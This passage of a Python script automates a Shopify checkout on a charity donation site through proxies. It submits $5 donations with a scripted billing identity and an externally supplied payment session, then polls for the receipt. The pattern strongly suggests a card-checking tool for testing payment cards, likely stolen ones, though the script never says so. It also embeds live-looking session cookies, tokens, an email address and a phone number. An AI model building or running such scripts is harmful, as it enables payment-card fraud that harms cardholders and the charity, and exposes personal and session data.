currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing company{id name externalId __typename}countryCode imageUrl market{id handle __typename}email ordersCount phone selectedCompanyLocation{id name externalId __typename}locationCount billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}contactInfoV2{...on EmailFormContents{email __typename}...on SMSFormContents{phoneNumber __typename}__typename}marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on AttributionItem{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}__typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{title minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}appId extensionLocale extensionPoints translations scriptUrl uuid registrationUuid version apiVersion __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}',
    'variables': {
        'input': {
            'checkpointData': None,
            'sessionInput': {
                'sessionToken': x_checkout_one_session_token,
            },
            'queueToken': queue_token,
            'discounts': {
                'lines': [],
                'acceptUnexpectedDiscounts': True,
            },
            'delivery': {
                'deliveryLines': [
                    {
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyMatchingConditions': {
                                'estimatedTimeInTransit': {
                                    'any': True,
                                },
                                'shipments': {
                                    'any': True,
                                },
                            },
                            'options': {},
                        },
                        'targetMerchandiseLines': {
                            'lines': [
                                {
                                    'stableId': '{stable_id}',
                                },
                            ],
                        },
                        'deliveryMethodTypes': [
                            'NONE',
                        ],
                        'expectedTotalPrice': {
                            'any': True,
                        },
                        'destinationChanged': True,
                    },
                ],
                'noDeliveryRequired': [],
                'useProgressiveRates': False,
                'prefetchShippingRatesStrategy': None,
            },
            'merchandise': {
                'merchandiseLines': [
                    {
                        'stableId': '{stable_id}',
                        'merchandise': {
                            'productVariantReference': {
                                'id': 'gid://shopify/ProductVariantMerchandise/34509026721951',
                                'variantId': 'gid://shopify/ProductVariant/34509026721951',
                                'properties': [],
                                'sellingPlanId': None,
                                'sellingPlanDigest': None,
                            },
                        },
                        'quantity': {
                            'items': {
                                'value': 1,
                            },
                        },
                        'expectedTotalPrice': {
                            'value': {
                                'amount': '5.00',
                                'currencyCode': 'USD',
                            },
                        },
                        'lineComponentsSource': None,
                        'lineComponents': [],
                    },
                ],
            },
            'payment': {
                'totalAmount': {
                    'any': True,
                },
                'paymentLines': [
                    {
                        'paymentMethod': {
                            'directPaymentMethod': {
                                'paymentMethodIdentifier': paymentMethodIdentifier,
                                'sessionId': sessionid,
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': '3448 Ile De France St #242',
                                        'city': 'Fort Wainwright',
                                        'countryCode': 'US',
                                        'postalCode': '99611',
                                        'firstName': 'techno',
                                        'lastName': 'tinker',
                                        'zoneCode': 'AK',
                                        'phone': '12013514000',
                                    },
                                },
                                'cardSource': None,
                            },
                            'giftCardPaymentMethod': None,
                            'redeemablePaymentMethod': None,
                            'walletPaymentMethod': None,
                            'walletsPlatformPaymentMethod': None,
                            'localPaymentMethod': None,
                            'paymentOnDeliveryMethod': None,
                            'paymentOnDeliveryMethod2': None,
                            'manualPaymentMethod': None,
                            'customPaymentMethod': None,
                            'offsitePaymentMethod': None,
                            'customOnsitePaymentMethod': None,
                            'deferredPaymentMethod': None,
                            'customerCreditCardPaymentMethod': None,
                            'paypalBillingAgreementPaymentMethod': None,
                        },
                        'amount': {
                            'value': {
                                'amount': '5',
                                'currencyCode': 'USD',
                            },
                        },
                        'dueAt': None,
                    },
                ],
                'billingAddress': {
                    'streetAddress': {
                        'address1': '3448 Ile De France St #242',
                        'city': 'Fort Wainwright',
                        'countryCode': 'US',
                        'postalCode': '99611',
                        'firstName': 'techno',
                        'lastName': 'tinker',
                        'zoneCode': 'AK',
                        'phone': '12013514000',
                    },
                },
            },
            'buyerIdentity': {
                'customer': {
                    'presentmentCurrency': 'USD',
                    'countryCode': 'US',
                },
                'contactInfoV2': {
                    'emailOrSms': {
                        'value': 'technotinker2020@gmail.com',
                        'emailOrSmsChanged': False,
                    },
                },
                'marketingConsent': [
                    {
                        'email': {
                            'value': 'technotinker2020@gmail.com',
                        },
                    },
                ],
                'shopPayOptInPhone': {
                    'number': '12013514000',
                    'countryCode': 'US',
                },
            },
            'tip': {
                'tipLines': [],
            },
            'taxes': {
                'proposedAllocations': None,
                'proposedTotalAmount': {
                    'value': {
                        'amount': '0',
                        'currencyCode': 'USD',
                    },
                },
                'proposedTotalIncludedAmount': None,
                'proposedMixedStateTotalAmount': None,
                'proposedExemptions': [],
            },
            'note': {
                'message': None,
                'customAttributes': [],
            },
            'localizationExtension': {
                'fields': [],
            },
            'nonNegotiableTerms': None,
            'scriptFingerprint': {
                'signature': None,
                'signatureUuid': None,
                'lineItemScriptChanges': [],
                'paymentScriptChanges': [],
                'shippingScriptChanges': [],
            },
            'optionalDuties': {
                'buyerRefusesDuties': False,
            },
        },
        'attemptToken': f'{token}-evk3paix57n',
        'metafields': [],
        'analytics': {
            'requestUrl': f'https://www.popforacause.org/checkouts/cn/{token}?locale=en',
            'pageId': '93bd2977-E5A9-4263-A2AE-61F35B868CD7',
        },
    },
    'operationName': 'SubmitForCompletion',
}

    r6 = r.post("https://www.popforacause.org/checkouts/unstable/graphql", headers=headers5,json=json_data5, proxies=proxies)

    print(r6.text)

    receipt_id = r6.json()['data']['submitForCompletion']['receipt']['id']

    time.sleep(6)

    headers9 = {
    'accept': 'application/json',
    'accept-language': 'en',
    'content-type': 'application/json',
    # 'cookie': 'secure_customer_sig=; localization=US; cart_currency=USD; _cmp_a=%7B%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%7D; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22s%22%3A%22%22%2C%22p%22%3A%22%22%2C%22m%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22reg%22%3A%22%22%2C%22region%22%3A%22INTN%22%7D; _shopify_y=fc2515f3-ca66-4ee5-93a1-a9ed6dc6a106; _orig_referrer=https%3A%2F%2Fweb.telegram.org%2F; _landing_page=%2F; receive-cookie-deprecation=1; _shopify_sa_p=; cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUhUOVZQWE5UUENORFM0RlRNOENQQ05RNA; cart_sig=fe12c356e1409729e830864f99e8a794; keep_alive=e5d183b0-7396-4df2-a58a-097a8606f525; checkout_session_lookup=%7B%22version%22%3A1%2C%22keys%22%3A%5B%7B%22source_id%22%3A%22Z2NwLWFzaWEtc291dGhlYXN0MTowMUhUOVZQWE5UUENORFM0RlRNOENQQ05RNA%22%2C%22checkout_session_identifier%22%3A%22aa6f7dbeb2f022c94c91d12b20b926cc%22%2C%22source_type_abbrev%22%3A%22cn%22%2C%22updated_at%22%3A%222024-03-31T08%3A59%3A56.585Z%22%7D%5D%7D; checkout_session_token__cn__Z2NwLWFzaWEtc291dGhlYXN0MTowMUhUOVZQWE5UUENORFM0RlRNOENQQ05RNA=%7B%22token%22%3A%22Z1YvTGdLNys1Vk5RTGE3VjhPQlM2TkNONnNqUzhidnRMMmZ1blUyb3RkZ0xlUXBldkwySmt2OWdhS1M3Z25pM2NpSEN1bVdEcUdKdVBOYTZteHJwcWVIcE54V2dMQ2hETnpEemdEQXZGZFJOSmVvczk3SDFYNzQ4NHYwd09uNUYxWmdPZ2lGOGpmZkZTT2xycGNzbERlYTFSUEJYYXNUL3JjWHJUc0pKQmc5WDVObkNUTXZlbGIzV1dzSHVPZUlyUkt5dDhqQ2psUzJ3ZWlnMitEY1R2RUhyQnlzMzhUcDdOR0NDcktmeTF4M3J6K05ZWWt2bDlaUk1FVzVpSW15Z0VoMVU2VzZGRlUzUGVvT3EyQy9IbWhscVpicmZzZXc3MmNzZ3d1cTdTZWl3WHc9PS0tZXU4aEYxVzd2TmQycnB5Ky0tUjdqdXdNTFo5RWVYQjV1ZHNPMlJzZz09%22%2C%22locale%22%3A%22en%22%2C%22checkout_session_identifier%22%3A%22aa6f7dbeb2f022c94c91d12b20b926cc%22%2C%22permanent_domain%22%3A%22pop-for-a-cause.myshopify.com%22%2C%22cart_preview%22%3A%7B%22cart_ts%22%3A%221711875596%22%2C%22cart_sig%22%3A%22fe12c356e1409729e830864f99e8a794%22%2C%22is_dryrun%22%3Afalse%2C%22cart%22%3A%7B%22token%22%3A%22Z2NwLWFzaWEtc291dGhlYXN0MTowMUhUOVZQWE5UUENORFM0RlRNOENQQ05RNA%22%2C%22original_item_count%22%3A1%2C%22items%22%3A%5B%7B%22id%22%3A34509026721951%2C%22quantity%22%3A1%2C%22final_line_price%22%3A500%2C%22product_title%22%3A%22Donate%2BHere!%22%2C%22variant_title%22%3A%225%22%2C%22featured_image%22%3A%7B%22alt%22%3A%22Donate%2BHere!%22%2C%22url%22%3A%22https%3A%2F%2Fcdn.shopify.com%2Fs%2Ffiles%2F1%2F0397%2F1609%2F4111%2Fproducts%2F72173cbeea.png%3Fv%3D1590880969%22%7D%7D%5D%2C%22currency%22%3A%22USD%22%2C%22had_truncated_line_items%22%3Afalse%7D%7D%7D; skip_shop_pay=false; _shopify_s=5a832320-3ebb-4c8b-a016-3991633904d0; cart_ts=1711875781; queue_token=AoH_2V6YhYZSphINN1E_ycWN68sWE2aNn4ZJW6x42Kkfg_tkfOfoF49_86s64djCcmHI23DiOcfu_szDnDj4djiTBVm6TS948i1MME9gXMeTdmCYLozebbe9f5aagt9FbLdPcvAtt0M5FZJHr0vpLJgLBAI1iB1ZoJEPGDTQIHVFu3SLvcCy8wNJ; _shopify_sa_t=2024-03-31T09%3A04%3A33.260Z; unique_interaction_id=12345616f9e3f1-18d3542b15245b-c96840ce30687-572b2626ed0c7',
    'origin': 'https://www.popforacause.org',
    'referer': 'https://www.popforacause.org/',
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'x-checkout-one-session-token': x_checkout_one_session_token,
    'x-checkout-web-build-id': '5c00fdbd8287cb86b70726c21929d2fddbe095b3',
    'x-checkout-web-deploy-stage': 'production',
    'x-checkout-web-server-handling': 'fast',
    'x-checkout-web-source-id': token,
}

    json_data9 = {
    'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}analytics{checkoutCompletedEventId __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor __typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderBundleLineComponent{stableId merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}buyerIdentity{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone selectedCompanyLocation{id name externalId __typename}locationCount company{id name externalId __typename}market{id handle __typename}__typename}}__typename}merchandise{merchandiseLines{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code 